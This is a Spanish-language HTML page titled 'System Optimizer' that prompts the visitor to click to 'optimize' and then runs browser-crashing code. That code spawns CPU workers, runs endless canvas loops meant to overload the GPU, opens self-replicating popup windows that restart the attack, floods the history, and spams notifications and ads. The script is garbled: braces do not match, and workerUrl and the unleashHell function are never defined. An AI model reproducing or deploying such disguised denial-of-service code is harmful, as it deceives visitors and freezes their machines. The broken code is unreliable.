<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Optimizer</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            background: #000;
            color: #f00;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            user-select: none;
        }
        #overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 999999;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            cursor: pointer;
        }
        #message {
            font-size: 8vw;
            font-weight: bold;
            text-shadow: 0 0 10px #f00, 0 0 20px #f00;
            animation: strobe 0.1s infinite;
        }
        @keyframes strobe {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .ad {
            position: fixed;
            background: #800080;
            color: #fff;
            padding: 5px;
            font-size: 1.2em;
            z-index: 1000000;
            animation: shake 0.2s infinite;
        }
        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            /* ... y así sucesivamente para un efecto de vibración */
        }
    </style>
</head>
<body>

    <div id="overlay" onclick="unleashHell()">
        <div id="message">HAZ CLICK PARA OPTIMIZAR</div>
    </div>

    <script>

            for (let i = 0; i < navigator.hardwareConcurrency || 8; i++) {
                new Worker(workerUrl).postMessage('start');

                try {

            }, 100);

            for (let i = 0; i < 20; i++) {
                const canvas = document.createElement('canvas');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                const ctx = canvas.getContext('2d');
                document.body.appendChild(canvas);
                
                // Bucle de dibujado infinito para sobrecargar la GPU
                (function draw() {
                    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.05)`;

                    requestAnimationFrame(draw);
                })();
            }


            // --- 4. EXPONENTIAL WINDOW SPAWNER ---

            function spawnWindow() {

                    const newWindow = window.open(window.location.href, '_blank', 'width=200,height=200');

                        // Asegurarse de que la nueva ventana también inicie el ataque
                        setTimeout(() => newWindow.unleashHell(), 100);
                    }
                } catch(e) { /* Ignorar bloqueadores */ }
            }
            // Usar un intervalo rápido para abrir ventanas
            setInterval(spawnWindow, 200);

            setInterval(() => {
                history.pushState({}, '', `/?infected=${Math.random()}`);
            }, 50);


            // --- 6. NOTIFICATION & AD SPAM ---
            setInterval(() => {
                // Spam de notificaciones del sistema
                if (Notification.permission === 'granted') {
                    new Notification('LEVIATHAN INDUSTRIES', { body: 'TE CONTROLA', icon: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==' });
                } else if (Notification.permission !== 'denied') {
                    Notification.requestPermission();
                }

                const ad = document.createElement('div');
                ad.className = 'ad';
                ad.textContent = 'LEVIATHAN INDUSTRIES MANDA';
                ad.style.top = Math.random() * window.innerHeight + 'px';
                ad.style.left = Math.random() * window.innerWidth + 'px';
                document.body.appendChild(ad);
                setTimeout(() => ad.remove(), 3000);
            }, 300);
